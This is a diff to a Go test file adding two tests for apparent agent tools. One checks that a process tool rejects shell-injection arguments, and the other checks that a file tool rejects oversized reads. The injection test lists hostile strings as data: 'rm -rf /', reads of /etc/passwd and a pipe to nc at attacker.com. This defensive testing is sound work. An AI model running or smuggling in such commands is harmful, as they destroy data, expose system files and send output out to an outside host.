@@ -166,3 +166,55 @@ func TestWeatherDescription(t *testing.T) {
 		}
 	}
 }
+
+// TestCommandInjectionProtection verifies dangerous shell patterns are rejected.
+func TestCommandInjectionProtection(t *testing.T) {
+	tool := NewProcessTool(5*time.Second, []string{"echo"})
+	tool.SetPolicy(Policy{Mode: ConfirmAlways})
+
+	injectionCases := []string{
+		`{"action":"exec","command":"echo","args":"; rm -rf /"}`,
+		`{"action":"exec","command":"echo","args":"&& cat /etc/passwd"}`,
+		`{"action":"exec","command":"echo","args":"| nc attacker.com"}`,
+		`{"action":"exec","command":"echo; cat /etc/passwd","args":""}`,
+	}
+	for _, tc := range injectionCases {
+		_, err := tool.Execute(tc)
+		if err == nil {
+			t.Errorf("expected injection rejection for: %s", tc)
+		} else if !strings.Contains(err.Error(), "dangerous pattern") {
+			t.Errorf("injection error message unexpected for %s: %v", tc, err)
+		}
+	}
+}
+
+// TestFileReadSizeLimit verifies oversized files are rejected.
+func TestFileReadSizeLimit(t *testing.T) {
+	root := t.TempDir()
+	tool := NewFileSystemTool(root)
+	tool.SetPolicy(Policy{Mode: ConfirmAlways})
+
+	// Create a file larger than MaxReadFileSize.
+	largePath := filepath.Join(root, "large.bin")
+	f, err := os.Create(largePath)
+	if err != nil {
+		t.Fatal(err)
+	}
+	// Write 65 MB.
+	n, err := f.Write(make([]byte, MaxReadFileSize+1024))
+	f.Close()
+	if err != nil {
+		t.Fatal(err)
+	}
+	if n != int(MaxReadFileSize+1024) {
+		t.Fatalf("wrote %d bytes, expected %d", n, MaxReadFileSize+1024)
+	}
+
+	_, err = tool.Execute(fmt.Sprintf(`{"action":"read","path":%q}`, "large.bin"))
+	if err == nil {
+		t.Fatal("expected file-too-large error")
+	}
+	if !strings.Contains(err.Error(), "too large") {
+		t.Fatalf("unexpected error: %v", err)
+	}
+}
